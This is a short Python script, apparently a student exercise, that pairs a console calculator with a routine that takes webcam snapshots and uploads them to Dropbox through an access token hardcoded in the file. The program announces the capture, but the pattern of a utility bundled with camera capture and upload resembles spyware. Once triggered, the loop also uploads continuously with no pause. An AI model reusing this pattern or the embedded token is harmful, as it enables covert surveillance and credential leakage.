import cv2
import time
import dropbox
import random

start_time = time.time()

def take_snapshot():
    number = random.randint(0, 100)
    videoCaptureObject = cv2.VideoCapture(0)
    result= True
    while(result):
        ret, frame = videoCaptureObject.read()
        img_name = "img" + str(number) + ".png"
        cv2.imwrite(img_name, frame)
        result = False
        return img_name
    videoCaptureObject.release()
    cv2.destroyAllWindows()

def upload_file(img_name):
    access_token = "kqQnDU-9crcAAAAAAAAAAcdSJ8FDBRjdYRnblnywXsgGwDYiLDvkDr4gbxmRoF1p"
    file = img_name
    file_from = file
    file_to = "/newFolder1/" + img_name
    dbx = dropbox.Dropbox(access_token)
    with open(file_from, 'rb') as f:
        dbx.files_upload(f.read(), file_to, mode = dropbox.files.WriteMode.overwrite)

def main():
    while(True):
        if((time.time()- start_time)>=120):
            name= take_snapshot()
            upload_file(name)

# Calculator part
print("Calculator + Picture")
print("get your picture while running this program after every 2 minutes. Same time do your calculation!")
print(' 1 To Add')
print(' 2 To Subtract')
print(' 3 To Multiply')
print(' 4 To Divide')

choice =   int(input("Please select your type:- "))
num1   =   int(input("Enter The First Number:- "))
num2   =   int(input("Enter The Second Number:- "))

addNumber = num1 + num2
subNumber =num1 - num2
multiplyNumber = num1 * num2
divideNumber = num1 / num2

if choice == 1:
    print("Your Answer = ", addNumber)
elif choice == 2:
    print("Your Answer = ",subNumber)
elif choice == 3:
    print("Your Answer = ",multiplyNumber)
elif choice == 4:
    print("Your Answer = ",divideNumber)
else:
    print("The type you selected is invalid")    

main()
